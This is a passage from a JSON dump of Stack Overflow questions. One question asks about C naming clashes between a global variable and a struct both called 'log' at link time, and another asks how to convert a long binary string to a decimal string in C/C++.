name some variables <strong>log</strong> (assuming I will link all object files) ?</p>\n\n<p><strong>EDIT</strong>: I am not familiar with how compiler/linker works. If there is a global variable name <strong>log</strong>, and the file that contains the global variable is linked to the sole source file in which structure <strong>log</strong> is defined, wouldn't that cause any confusion when linking, one <strong>log</strong> is a variable name while another <strong>log</strong> is a type name?</p>\n"},{"tags":["c++","c"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":119,"score":3,"question_id":13166785,"title":"How to convert binary string to integer string","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/117844/converting-string-of-1s-and-0s-into-binary-value\">Converting string of 1s and 0s into binary value</a>  </p>\n</blockquote>\n\n\n\n<p>Lets say that I have string which contains 1024 characters (represents 0 and 1). I want to present it as an number in decimal base (also as a string). The tricky part is that i have to do it in C/C++ without 3rd part libraries. Any clues?</p>\n"}]}
